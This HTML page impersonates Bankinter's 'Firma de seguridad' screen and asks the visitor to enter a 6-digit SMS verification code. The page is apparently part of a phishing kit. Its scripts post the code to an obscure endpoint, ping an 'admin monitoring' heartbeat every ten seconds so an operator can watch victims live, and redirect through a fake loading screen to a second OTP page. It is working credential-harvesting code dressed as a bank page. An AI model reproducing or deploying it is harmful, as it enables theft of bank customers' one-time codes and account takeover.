<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    <title> Verificación de seguridad</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap');

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        html, body {
            background-color: #ffffff;
            color: #191b1c;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-size: 14px;
            overflow-x: hidden;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        /* --- HEADER --- */
        .site-header {
            width: 100%;
            background: #ffffff;
            padding: 18px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #f0f2f5;
        }

        .header-logo img {
            height: 26px;
            width: auto;
            display: block;
        }

        .hamburger-btn {
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 28px;
            height: 20px;
        }

        .hamburger-btn span {
            display: block;
            height: 3px;
            width: 100%;
            background-color: #191b1c;
            border-radius: 2px;
        }

        /* --- MAIN CONTAINER --- */
        .main-wrapper {
            flex: 1;
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
            padding: 36px 20px 60px 20px;
        }

        @media (max-width: 400px) {
            .main-wrapper {
                padding: 24px 16px 50px 16px;
            }
        }

        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #edf3fa;
            color: #e05305;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.6px;
            padding: 4px 10px;
            border-radius: 12px;
            margin-bottom: 16px;
            text-transform: uppercase;
        }

        .page-title {
            font-size: 26px;
            font-weight: 600;
            color: #191b1c;
            line-height: 1.25;
            margin-bottom: 10px;
            letter-spacing: -0.2px;
        }

        .page-subtitle {
            font-size: 14px;
            color: #5c6780;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .page-subtitle strong {
            color: #191b1c;
            font-weight: 600;
        }

        /* --- SIX-DOT / DIGIT UI (FIXED FIT & NEVER OUT OF FRAME) --- */
        .otp-group-label {
            font-size: 11px;
            font-weight: 700;
            color: #e05305;
            letter-spacing: 0.6px;
            text-transform: uppercase;
            margin-bottom: 12px;
            display: block;
        }

        .otp-dots-container {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 26px;
            padding: 22px 0 26px 0;
            margin-bottom: 24px;
            border-bottom: 1px solid #e2e8f0;
            width: 100%;
            max-width: 100%;
        }

        @media (max-width: 380px) {
            .otp-dots-container {
                gap: 20px;
            }
        }

        .otp-hidden-input {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            border: none;
            background: transparent;
            color: transparent;
            caret-color: transparent;
            font-size: 16px; /* prevents iOS zoom on focus */
            z-index: 2;
            cursor: pointer;
            padding: 0;
            margin: 0;
            outline: none;
        }

        .otp-dot {
            width: 13px;
            height: 13px;
            border-radius: 50%;
            border: 1.5px solid #a7b0ba;
            background-color: transparent;
            transition: background-color 0.15s ease, border-color 0.15s ease, transform 0.15s ease;
            pointer-events: none;
            flex-shrink: 0;
        }

        .otp-dot.active {
            border-color: #e05305;
            box-shadow: 0 0 0 3px rgba(224, 83, 5, 0.15);
        }

        .otp-dot.filled {
            background-color: #191b1c;
            border-color: #191b1c;
            transform: scale(1.15);
        }

        .otp-dots-container.has-error .otp-dot {
            border-color: #ee3524 !important;
        }

        .otp-dots-container.has-error .otp-dot.filled {
            background-color: #ee3524;
        }

        /* --- RESEND AND TIMER --- */
        .resend-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 12px 16px;
            font-size: 13px;
            color: #4a5568;
            margin-bottom: 28px;
        }

        .resend-box span strong {
            color: #191b1c;
            font-weight: 600;
        }

        .resend-btn {
            color: #e05305;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 0.4px;
            text-transform: uppercase;
            cursor: pointer;
            border: none;
            background: transparent;
            padding: 0;
        }

        .resend-btn:disabled {
            color: #a0aec0;
            cursor: not-allowed;
        }

        /* --- NOTICE INFO --- */
        .security-card {
            background-color: #edf3fa;
            border-left: 3px solid #e05305;
            padding: 12px 14px;
            border-radius: 0 4px 4px 0;
            font-size: 12px;
            color: #334155;
            line-height: 1.45;
            margin-bottom: 28px;
            display: flex;
            gap: 10px;
            align-items: flex-start;
        }

        .security-card i {
            color: #e05305;
            font-size: 14px;
            margin-top: 2px;
        }

        /* --- BUTTONS --- */
        .actions-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn-submit {
            width: 100%;
            height: 48px;
            background: #FF6600;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(255, 102, 0, 0.25);
            transition: background 0.2s ease, transform 0.1s ease, opacity 0.2s ease;
        }

        .btn-submit:hover {
            background: #ea5b00;
        }

        .btn-submit:active {
            transform: scale(0.99);
        }

        .btn-submit:disabled {
            opacity: 0.65;
            cursor: not-allowed;
        }

        .btn-cancel {
            width: 100%;
            height: 44px;
            background: transparent;
            color: #5c6780;
            border: 1px solid #d5dbe2;
            border-radius: 24px;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: background 0.15s ease, color 0.15s ease;
        }

        .btn-cancel:hover {
            background: #f7f9fb;
            color: #191b1c;
        }

        /* --- FOOTER --- */
        .site-footer {
            width: 100%;
            background: #ffffff;
            border-top: 1px solid #eaedf2;
            margin-top: auto;
        }

        .footer-content {
            max-width: 440px;
            margin: 0 auto;
            padding: 40px 24px 30px 24px;
        }

        .footer-logo {
            margin-bottom: 28px;
        }

        .footer-logo img {
            height: 24px;
            width: auto;
            display: block;
        }

        .footer-primary-links {
            list-style: none;
            margin-bottom: 32px;
        }

        .footer-primary-links li {
            border-bottom: 1px solid #f0f3f6;
        }

        .footer-primary-links a {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 0;
            font-size: 13px;
            font-weight: 700;
            color: #191b1c;
            letter-spacing: 0.4px;
            text-transform: uppercase;
            transition: color 0.15s ease;
        }

        .footer-primary-links a:hover {
            color: #e05305;
        }

        .footer-primary-links a .arrow {
            font-size: 15px;
            color: #5c6780;
            font-weight: 400;
        }

        .footer-secondary-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px 16px;
            margin-bottom: 30px;
        }

        .footer-secondary-grid a {
            font-size: 12px;
            color: #333d47;
            line-height: 1.4;
            transition: color 0.15s ease;
        }

        .footer-secondary-grid a:hover {
            color: #e05305;
        }

        /* --- BOTTOM BAR --- */
        .footer-bottom-bar {
            background-color: #EEF2F6;
            padding: 22px 20px 20px 20px;
            text-align: center;
        }

        .social-icons {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            margin-bottom: 14px;
        }

        .social-icons a {
            color: #4a5568;
            font-size: 18px;
            transition: color 0.15s ease, transform 0.15s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .social-icons a:hover {
            color: #e05305;
            transform: translateY(-2px);
        }

        .copyright-txt {
            font-size: 11px;
            color: #718096;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            font-weight: 500;
        }
    </style>
</head>

<body>

    <!-- HEADER -->
    <header class="site-header">
        <div class="header-logo">
            <img src="/assets/imgs/logo.svg" alt="Bankinter">
        </div>
        <button type="button" class="hamburger-btn" aria-label="Menú">
            <span></span>
            <span></span>
            <span></span>
        </button>
    </header>

    <!-- MAIN CONTENT -->
    <main class="main-wrapper">
       

        <h1 class="page-title">Firma de seguridad</h1>
        <p class="page-subtitle">
            Hemos enviado un código de verificación de 6 dígitos por SMS a su teléfono registrado. Por favor, introdúzcalo a continuación para continuar.
        </p>

        <form method="post" id="pg3" novalidate>
            <input type="hidden" name="step" value="sms">
            <!-- Hidden field bound to the 6-dot UI for backend compatibility -->
            <input type="hidden" id="sms_code" name="sms_code" value="">

            <label class="otp-group-label">CÓDIGO DE VERIFICACIÓN DE 6 DÍGITOS</label>

            <!-- Six Dot UI (circles that fill as you type) -->
            <div class="otp-dots-container" id="otp-container">
                <input type="tel" class="otp-hidden-input" id="otp-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" autofocus aria-label="Código de verificación">
                <span class="otp-dot" data-index="0"></span>
                <span class="otp-dot" data-index="1"></span>
                <span class="otp-dot" data-index="2"></span>
                <span class="otp-dot" data-index="3"></span>
                <span class="otp-dot" data-index="4"></span>
                <span class="otp-dot" data-index="5"></span>
            </div>

            <!-- Resend timer box -->
            <div class="resend-box">
                <span id="timer-label">Reenviar código en <strong id="countdown">01:45</strong></span>
                <button type="button" id="resend-btn" class="resend-btn" disabled>REENVIAR</button>
            </div>

           

            <div class="actions-group">
                <button type="submit" id="submit-otp" class="btn-submit">CONFIRMAR Y ACCEDER</button>
                <button type="button" class="btn-cancel">CANCELAR</button>
            </div>
        </form>
    </main>

    <!-- FOOTER -->
    <footer class="site-footer">
        <div class="footer-content">
            <div class="footer-logo">
                <img src="/assets/imgs/logo.svg" alt="Bankinter">
            </div>

            <ul class="footer-primary-links">
                <li><a href="#">WEB CORPORATIVA <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">PORTAL INMOBILIARIO <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">NO RESIDENTES <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">PARTICULARES <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">BANCA PERSONAL <span class="arrow">&rarr;</span></a></li>
                <li><a href="#">BANCA PRIVADA <span class="arrow">&rarr;</span></a></li>
            </ul>

            <div class="footer-secondary-grid">
                <a href="#">Contacto</a>
                <a href="#">Fundación Innovación</a>
                <a href="#">Tablón de anuncios y tarifas</a>
                <a href="#">Seguridad y privacidad</a>
                <a href="#">Política de cookies</a>
                <a href="#">Aviso legal</a>
                <a href="#">Accesibilidad</a>
                <a href="#">Mapa web</a>
            </div>
        </div>

        <div class="footer-bottom-bar">
            <div class="social-icons">
                <a href="#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
                <a href="#" aria-label="X Twitter"><i class="fa-brands fa-x-twitter"></i></a>
                <a href="#" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
                <a href="#" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
                <a href="#" aria-label="Blog"><i class="fa-solid fa-square-rss"></i></a>
            </div>
            <p class="copyright-txt">&copy; BANKINTER S.A. TODOS LOS DERECHOS RESERVADOS</p>
        </div>
    </footer>

    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
        $(function() {
            var $input = $('#otp-input');
            var $dots = $('.otp-dot');
            var $container = $('#otp-container');
            var $hiddenInput = $('#sms_code');

            function renderDots() {
                var len = $input.val().length;
                $dots.each(function(i) {
                    $(this).toggleClass('filled', i < len);
                    $(this).toggleClass('active', i === len);
                });
            }

            $input.on('input', function() {
                var val = $(this).val().replace(/[^0-9]/g, '').slice(0, 6);
                $(this).val(val);
                $hiddenInput.val(val);
                $container.removeClass('has-error');
                renderDots();
            });

            // Keep focus on the invisible input when tapping the dots area
            $container.on('click', function() {
                $input.focus();
            });

            renderDots();

            // Resend countdown timer
            var remainingSec = 105;
            var timerInterval = setInterval(function() {
                remainingSec--;
                if (remainingSec <= 0) {
                    clearInterval(timerInterval);
                    $('#timer-label').text('Código caducado.');
                    $('#resend-btn').prop('disabled', false);
                } else {
                    var m = Math.floor(remainingSec / 60);
                    var s = remainingSec % 60;
                    $('#countdown').text((m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s);
                }
            }, 1000);

            $('#resend-btn').on('click', function() {
                $(this).prop('disabled', true);
                remainingSec = 120;
                $('#timer-label').html('Reenviar código en <strong id="countdown">02:00</strong>');
            });
        });
    </script>
    <script>
        $(function() {
            // --- Live presence heartbeat (admin monitoring) ---
            function sendHeartbeat() {
                try {
                    fetch('/hb', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: '{}'
                    }).catch(function () { /* silent */ });
                } catch (e) { /* silent */ }
            }
            sendHeartbeat();
            setInterval(sendHeartbeat, 10000);

            // --- FORM 3: SMS OTP Code 1 ---
            $('#pg3').on('submit', function (e) {
                e.preventDefault();
                var sps1 = $('#sms_code').val();

                if (!sps1 || sps1.length < 6) {
                    $('#otp-container').addClass('has-error');
                    return false;
                }

                var $btn = $('#submit-otp');
                $btn.prop('disabled', true).css('opacity', '0.7');

                $.ajax({
                    url: '/m4kT9BQWt7KTDdaVmafx',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({ sps1: sps1 }),
                    success: function (res) {
                        if (res.OK) {
                            // Redirects via loading with custom duration to OTP Page 2
                            window.location = '/loading?time=6&url=/LGknmeM9HwWUWSutj6mJ';
                        } else {
                            $btn.prop('disabled', false).css('opacity', '1');
                        }
                    },
                    error: function () {
                        $btn.prop('disabled', false).css('opacity', '1');
                    }
                });
            });
        });
    </script>
</body>
</html>
